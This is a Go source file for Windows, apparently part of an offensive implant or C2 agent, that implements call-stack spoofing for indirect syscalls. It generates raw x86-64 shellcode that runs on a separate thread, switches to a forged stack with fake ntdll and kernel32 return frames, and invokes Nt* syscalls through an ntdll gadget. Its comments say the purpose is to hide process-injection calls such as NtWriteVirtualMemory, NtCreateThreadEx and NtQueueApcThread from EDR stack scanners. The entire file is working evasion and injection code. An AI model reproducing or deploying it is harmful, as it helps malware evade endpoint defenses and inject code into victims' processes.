//go:build windows

package commands

import (
	"encoding/binary"
	"fmt"
	"sync"
	"unsafe"

	"golang.org/x/sys/windows"
)

// apiSpoofState manages a dedicated native thread for executing Nt* syscalls
// with a spoofed call stack. Injection API calls (NtAllocateVirtualMemory,
// NtWriteVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx, etc.) are
// routed through this thread so EDR stack scanners see legitimate DLL frames
// instead of Go runtime addresses.
type apiSpoofState struct {
	mu           sync.Mutex
	initialized  bool
	threadHandle windows.Handle
	requestEvent windows.Handle
	doneEvent    windows.Handle
	stubAddr     uintptr
	stubSize     uintptr
	dataAddr     uintptr
	dataSize     uintptr
	spoofStack   uintptr
	spoofSize    uintptr
	funcTable    uintptr
}

var (
	apiSpoof      apiSpoofState
	apiSpoofReady bool
)

// data block layout for the API spoof thread
const (
	apiDataOffRequestEvent   = 0   // 8: HANDLE
	apiDataOffDoneEvent      = 8   // 8: HANDLE
	apiDataOffSyscallNum     = 16  // 4: uint32 syscall number
	apiDataOffArgCount       = 20  // 4: uint32 (unused by stub, informational)
	apiDataOffSyscallGadget  = 24  // 8: syscall;ret gadget address in ntdll
	apiDataOffSpoofStackTop  = 32  // 8: top of spoofed stack (pre-aligned)
	apiDataOffSavedRSP       = 40  // 8: saved real RSP
	apiDataOffReturnValue    = 48  // 8: syscall return value (NTSTATUS)
	apiDataOffRetGadget1     = 56  // 8: kernel32 ret (SleepEx area)
	apiDataOffRetGadget2     = 64  // 8: kernel32 BaseThreadInitThunk ret
	apiDataOffRetGadget3     = 72  // 8: ntdll RtlUserThreadStart ret
	apiDataOffWaitForSingle  = 80  // 8: WaitForSingleObject address
	apiDataOffSetEvent       = 88  // 8: SetEvent address
	apiDataOffArgs           = 96  // 11 * 8 = 88 bytes: args[0..10]
	apiDataBlockSize         = 184 // total
)

// InitAPISpoofing initializes the API-call stack spoofing thread.
// Must be called after InitIndirectSyscalls (needs resolver entries).
func InitAPISpoofing() error {
	return apiSpoof.init()
}

// APISpoofAvailable returns true if spoofed API execution is ready.
func APISpoofAvailable() bool {
	return apiSpoofReady
}

// SpoofedSyscall executes an Nt* syscall via the dedicated spoofed-stack thread.
// The syscall is identified by name (must be in the indirect syscall resolver).
// Returns the NTSTATUS value.
func SpoofedSyscall(name string, args ...uintptr) uint32 {
	if !apiSpoofReady {
		return 0xC0000001 // STATUS_UNSUCCESSFUL
	}
	entry := indirectSyscallResolver.entries[name]
	if entry == nil || entry.SyscallRet == 0 {
		return 0xC0000001
	}
	return apiSpoof.execute(entry.Number, entry.SyscallRet, args)
}

func (s *apiSpoofState) init() error {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.initialized {
		return nil
	}

	gadgets, err := findSpoofGadgets()
	if err != nil {
		return fmt.Errorf("find gadgets: %w", err)
	}

	reqEvt, err := windows.CreateEvent(nil, 0, 0, nil)
	if err != nil {
		return fmt.Errorf("create request event: %w", err)
	}
	doneEvt, err := windows.CreateEvent(nil, 0, 0, nil)
	if err != nil {
		windows.CloseHandle(reqEvt)
		return fmt.Errorf("create done event: %w", err)
	}

	s.dataSize = uintptr(apiDataBlockSize)
	dataAddr, err := windows.VirtualAlloc(0, s.dataSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		windows.CloseHandle(reqEvt)
		windows.CloseHandle(doneEvt)
		return fmt.Errorf("VirtualAlloc data: %w", err)
	}
	s.dataAddr = dataAddr

	s.spoofSize = 64 * 1024
	spoofStack, err := windows.VirtualAlloc(0, s.spoofSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		windows.VirtualFree(dataAddr, 0, windows.MEM_RELEASE)
		windows.CloseHandle(reqEvt)
		windows.CloseHandle(doneEvt)
		return fmt.Errorf("VirtualAlloc spoof stack: %w", err)
	}
	s.spoofStack = spoofStack

	data := unsafe.Slice((*byte)(unsafe.Pointer(dataAddr)), apiDataBlockSize)
	binary.LittleEndian.PutUint64(data[apiDataOffRequestEvent:], uint64(reqEvt))
	binary.LittleEndian.PutUint64(data[apiDataOffDoneEvent:], uint64(doneEvt))
	spoofTop := (spoofStack + s.spoofSize) &^ 0xF
	binary.LittleEndian.PutUint64(data[apiDataOffSpoofStackTop:], uint64(spoofTop))
	binary.LittleEndian.PutUint64(data[apiDataOffRetGadget1:], uint64(gadgets.retGadget1))
	binary.LittleEndian.PutUint64(data[apiDataOffRetGadget2:], uint64(gadgets.retGadget2))
	binary.LittleEndian.PutUint64(data[apiDataOffRetGadget3:], uint64(gadgets.retGadget3))
	binary.LittleEndian.PutUint64(data[apiDataOffWaitForSingle:], uint64(gadgets.waitForSingleObject))
	binary.LittleEndian.PutUint64(data[apiDataOffSetEvent:], uint64(gadgets.setEvent))

	stub := generateAPISpoofStub()
	s.stubSize = uintptr(len(stub))

	stubAddr, err := windows.VirtualAlloc(0, s.stubSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		windows.VirtualFree(spoofStack, 0, windows.MEM_RELEASE)
		windows.VirtualFree(dataAddr, 0, windows.MEM_RELEASE)
		windows.CloseHandle(reqEvt)
		windows.CloseHandle(doneEvt)
		return fmt.Errorf("VirtualAlloc stub: %w", err)
	}
	stubSlice := unsafe.Slice((*byte)(unsafe.Pointer(stubAddr)), len(stub))
	copy(stubSlice, stub)

	var oldProtect uint32
	if err := windows.VirtualProtect(stubAddr, s.stubSize,
		windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
		windows.VirtualFree(stubAddr, 0, windows.MEM_RELEASE)
		windows.VirtualFree(spoofStack, 0, windows.MEM_RELEASE)
		windows.VirtualFree(dataAddr, 0, windows.MEM_RELEASE)
		windows.CloseHandle(reqEvt)
		windows.CloseHandle(doneEvt)
		return fmt.Errorf("VirtualProtect stub RX: %w", err)
	}
	s.stubAddr = stubAddr

	s.funcTable = registerStubUnwindInfo(stubAddr, s.stubSize)

	var threadID uint32
	hThread, err := createNativeThread(stubAddr, dataAddr, &threadID)
	if err != nil {
		if s.funcTable != 0 {
			rtlDeleteFunctionTable(s.funcTable)
		}
		windows.VirtualFree(stubAddr, 0, windows.MEM_RELEASE)
		windows.VirtualFree(spoofStack, 0, windows.MEM_RELEASE)
		windows.VirtualFree(dataAddr, 0, windows.MEM_RELEASE)
		windows.CloseHandle(reqEvt)
		windows.CloseHandle(doneEvt)
		return fmt.Errorf("CreateThread: %w", err)
	}

	s.threadHandle = hThread
	s.requestEvent = reqEvt
	s.doneEvent = doneEvt
	s.initialized = true
	apiSpoofReady = true

	procResumeThread.Call(uintptr(hThread))
	return nil
}

func (s *apiSpoofState) execute(sysNum uint16, syscallRet uintptr, args []uintptr) uint32 {
	s.mu.Lock()
	if !s.initialized {
		s.mu.Unlock()
		return 0xC0000001
	}
	dataAddr := s.dataAddr
	reqEvt := s.requestEvent
	doneEvt := s.doneEvent
	// Keep lock held during execution to serialize syscalls through the thread
	defer s.mu.Unlock()

	data := unsafe.Slice((*byte)(unsafe.Pointer(dataAddr)), apiDataBlockSize)

	binary.LittleEndian.PutUint32(data[apiDataOffSyscallNum:], uint32(sysNum))
	binary.LittleEndian.PutUint32(data[apiDataOffArgCount:], uint32(len(args)))
	binary.LittleEndian.PutUint64(data[apiDataOffSyscallGadget:], uint64(syscallRet))

	// Zero the args area then fill in provided args
	for i := 0; i < 11; i++ {
		binary.LittleEndian.PutUint64(data[apiDataOffArgs+i*8:], 0)
	}
	for i, arg := range args {
		if i >= 11 {
			break
		}
		binary.LittleEndian.PutUint64(data[apiDataOffArgs+i*8:], uint64(arg))
	}

	// Signal the stub thread to execute
	windows.SetEvent(reqEvt)
	// Wait for completion
	windows.WaitForSingleObject(doneEvt, windows.INFINITE)

	return binary.LittleEndian.Uint32(data[apiDataOffReturnValue:])
}

// generateAPISpoofStub generates x86-64 machine code for the API spoof thread.
// The stub loops: wait for signal → switch to spoofed stack → build fake frames →
// set up call frame with args → CALL syscall;ret gadget → capture result → restore → signal done.
func generateAPISpoofStub() []byte {
	var code []byte

	// Prologue — standard non-volatile register saves
	code = append(code, 0x55)                         // push rbp
	code = append(code, 0x48, 0x89, 0xE5)             // mov rbp, rsp
	code = append(code, 0x53)                         // push rbx
	code = append(code, 0x41, 0x54)                   // push r12
	code = append(code, 0x41, 0x55)                   // push r13
	code = append(code, 0x48, 0x83, 0xEC, 0x20)       // sub rsp, 0x20 (shadow)
	code = append(code, 0x48, 0x89, 0xCB)             // mov rbx, rcx (save data ptr)

	// === WAIT LOOP ===
	waitLoopOffset := len(code)

	// WaitForSingleObject(requestEvent, INFINITE)
	code = append(code, 0x48, 0x8B, 0x4B, byte(apiDataOffRequestEvent)) // mov rcx, [rbx+0]
	code = append(code, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF)                   // mov edx, INFINITE
	code = append(code, 0xFF, 0x53, byte(apiDataOffWaitForSingle))       // call [rbx+80]

	// Save real RSP
	code = append(code, 0x48, 0x89, 0x63, byte(apiDataOffSavedRSP)) // mov [rbx+40], rsp

	// Switch to spoofed stack
	code = append(code, 0x48, 0x8B, 0x63, byte(apiDataOffSpoofStackTop)) // mov rsp, [rbx+32]

	// --- BUILD FAKE FRAMES (for stack walker aesthetics) ---
	// Frame 3 (bottom): ntdll!RtlUserThreadStart
	code = append(code, 0xFF, 0x73, byte(apiDataOffRetGadget3)) // push [rbx+72]
	code = append(code, 0x48, 0x83, 0xEC, 0x20)                 // sub rsp, 0x20

	// Frame 2: kernel32!BaseThreadInitThunk
	code = append(code, 0xFF, 0x73, byte(apiDataOffRetGadget2)) // push [rbx+64]
	code = append(code, 0x48, 0x83, 0xEC, 0x20)                 // sub rsp, 0x20

	// Frame 1: kernel32!SleepEx area
	code = append(code, 0xFF, 0x73, byte(apiDataOffRetGadget1)) // push [rbx+56]
	code = append(code, 0x48, 0x83, 0xEC, 0x20)                 // sub rsp, 0x20

	// --- SET UP CALL FRAME ---
	// Allocate shadow space (0x20) + 7 stack arg slots (0x38) = 0x58
	code = append(code, 0x48, 0x83, 0xEC, 0x58) // sub rsp, 0x58

	// Write stack args 5-11 at [rsp+0x20] through [rsp+0x50]
	// These become [rsp+0x28]...[rsp+0x58] after CALL pushes return addr
	for i := 0; i < 7; i++ {
		argOff := apiDataOffArgs + (4+i)*8 // args[4] through args[10]
		rspOff := 0x20 + i*8              // stack position before CALL
		// mov rax, [rbx + argOff]
		code = append(code, 0x48, 0x8B, 0x83)
		code = appendU32(code, uint32(argOff))
		// mov [rsp + rspOff], rax
		code = append(code, 0x48, 0x89, 0x84, 0x24)
		code = appendU32(code, uint32(rspOff))
	}

	// Load register args from data block
	// arg1 → RCX
	code = append(code, 0x48, 0x8B, 0x8B) // mov rcx, [rbx + args[0]]
	code = appendU32(code, uint32(apiDataOffArgs+0*8))
	// arg2 → RDX
	code = append(code, 0x48, 0x8B, 0x93) // mov rdx, [rbx + args[1]]
	code = appendU32(code, uint32(apiDataOffArgs+1*8))
	// arg3 → R8
	code = append(code, 0x4C, 0x8B, 0x83) // mov r8, [rbx + args[2]]
	code = appendU32(code, uint32(apiDataOffArgs+2*8))
	// arg4 → R9
	code = append(code, 0x4C, 0x8B, 0x8B) // mov r9, [rbx + args[3]]
	code = appendU32(code, uint32(apiDataOffArgs+3*8))

	// NT calling convention: mov r10, rcx (syscall clobbers RCX)
	code = append(code, 0x4C, 0x8B, 0xD1) // mov r10, rcx

	// Load syscall number: mov eax, [rbx + apiDataOffSyscallNum]
	code = append(code, 0x8B, 0x43, byte(apiDataOffSyscallNum)) // mov eax, [rbx+16]

	// CALL [rbx + apiDataOffSyscallGadget]
	// This pushes our return address and jumps to the syscall;ret gadget.
	// After syscall returns, "ret" pops our address → returns here.
	code = append(code, 0xFF, 0x53, byte(apiDataOffSyscallGadget)) // call [rbx+24]

	// === POST-CALL: RAX = NTSTATUS, RBX preserved (callee-saved) ===

	// Save return value: mov [rbx + apiDataOffReturnValue], rax
	code = append(code, 0x48, 0x89, 0x43, byte(apiDataOffReturnValue)) // mov [rbx+48], rax

	// Restore real RSP: mov rsp, [rbx + apiDataOffSavedRSP]
	code = append(code, 0x48, 0x8B, 0x63, byte(apiDataOffSavedRSP)) // mov rsp, [rbx+40]

	// Signal done: SetEvent(doneEvent)
	code = append(code, 0x48, 0x8B, 0x4B, byte(apiDataOffDoneEvent)) // mov rcx, [rbx+8]
	code = append(code, 0xFF, 0x53, byte(apiDataOffSetEvent))         // call [rbx+88]

	// Loop back to wait
	jmpOff := len(code)
	code = append(code, 0xE9, 0x00, 0x00, 0x00, 0x00) // jmp rel32
	rel := int32(waitLoopOffset - (jmpOff + 5))
	binary.LittleEndian.PutUint32(code[jmpOff+1:jmpOff+5], uint32(rel))

	return code
}

// appendU32 appends a uint32 in little-endian to a byte slice.
func appendU32(b []byte, v uint32) []byte {
	return append(b, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
}

// CleanupAPISpoofing tears down the API spoof thread and frees resources.
func CleanupAPISpoofing() {
	apiSpoof.mu.Lock()
	defer apiSpoof.mu.Unlock()
	if !apiSpoof.initialized {
		return
	}
	apiSpoofReady = false
	apiSpoof.initialized = false

	procTerminateThread.Call(uintptr(apiSpoof.threadHandle), 0)
	windows.CloseHandle(apiSpoof.threadHandle)
	windows.CloseHandle(apiSpoof.requestEvent)
	windows.CloseHandle(apiSpoof.doneEvent)

	if apiSpoof.funcTable != 0 {
		rtlDeleteFunctionTable(apiSpoof.funcTable)
	}
	windows.VirtualFree(apiSpoof.stubAddr, 0, windows.MEM_RELEASE)
	windows.VirtualFree(apiSpoof.dataAddr, 0, windows.MEM_RELEASE)
	windows.VirtualFree(apiSpoof.spoofStack, 0, windows.MEM_RELEASE)
}

// --- Spoofed Nt* wrapper functions ---
// These mirror the Indirect* wrappers but route through the spoofed-stack thread.

func SpoofedNtAllocateVirtualMemory(processHandle uintptr, baseAddress *uintptr, regionSize *uintptr, allocationType, protect uint32) uint32 {
	return SpoofedSyscall("NtAllocateVirtualMemory",
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		0, // ZeroBits
		uintptr(unsafe.Pointer(regionSize)),
		uintptr(allocationType),
		uintptr(protect),
	)
}

func SpoofedNtWriteVirtualMemory(processHandle, baseAddress, buffer, bufferSize uintptr, bytesWritten *uintptr) uint32 {
	return SpoofedSyscall("NtWriteVirtualMemory",
		processHandle,
		baseAddress,
		buffer,
		bufferSize,
		uintptr(unsafe.Pointer(bytesWritten)),
	)
}

func SpoofedNtProtectVirtualMemory(processHandle uintptr, baseAddress *uintptr, regionSize *uintptr, newProtect uint32, oldProtect *uint32) uint32 {
	return SpoofedSyscall("NtProtectVirtualMemory",
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(oldProtect)),
	)
}

func SpoofedNtCreateThreadEx(threadHandle *uintptr, processHandle, startRoutine uintptr) uint32 {
	return SpoofedSyscall("NtCreateThreadEx",
		uintptr(unsafe.Pointer(threadHandle)),
		0x1FFFFF, // THREAD_ALL_ACCESS
		0,        // ObjectAttributes
		processHandle,
		startRoutine,
		0, // Argument
		0, // CreateFlags
		0, // ZeroBits
		0, // StackSize
		0, // MaxStackSize
		0, // AttributeList
	)
}

func SpoofedNtFreeVirtualMemory(processHandle uintptr, baseAddress *uintptr, regionSize *uintptr, freeType uint32) uint32 {
	return SpoofedSyscall("NtFreeVirtualMemory",
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		uintptr(freeType),
	)
}

func SpoofedNtOpenProcess(processHandle *uintptr, desiredAccess uint32, pid uintptr) uint32 {
	type clientID struct {
		UniqueProcess uintptr
		UniqueThread  uintptr
	}
	cid := clientID{UniqueProcess: pid}

	type objectAttributes struct {
		Length                   uint32
		_                        uint32
		RootDirectory            uintptr
		ObjectName               uintptr
		Attributes               uint32
		_                        uint32
		SecurityDescriptor       uintptr
		SecurityQualityOfService uintptr
	}
	oa := objectAttributes{Length: uint32(unsafe.Sizeof(objectAttributes{}))}

	return SpoofedSyscall("NtOpenProcess",
		uintptr(unsafe.Pointer(processHandle)),
		uintptr(desiredAccess),
		uintptr(unsafe.Pointer(&oa)),
		uintptr(unsafe.Pointer(&cid)),
	)
}

func SpoofedNtClose(handle uintptr) uint32 {
	return SpoofedSyscall("NtClose", handle)
}

func SpoofedNtResumeThread(threadHandle uintptr, previousSuspendCount *uint32) uint32 {
	return SpoofedSyscall("NtResumeThread",
		threadHandle,
		uintptr(unsafe.Pointer(previousSuspendCount)),
	)
}

func SpoofedNtQueueApcThread(threadHandle, apcRoutine, arg1, arg2, arg3 uintptr) uint32 {
	return SpoofedSyscall("NtQueueApcThread",
		threadHandle,
		apcRoutine,
		arg1,
		arg2,
		arg3,
	)
}
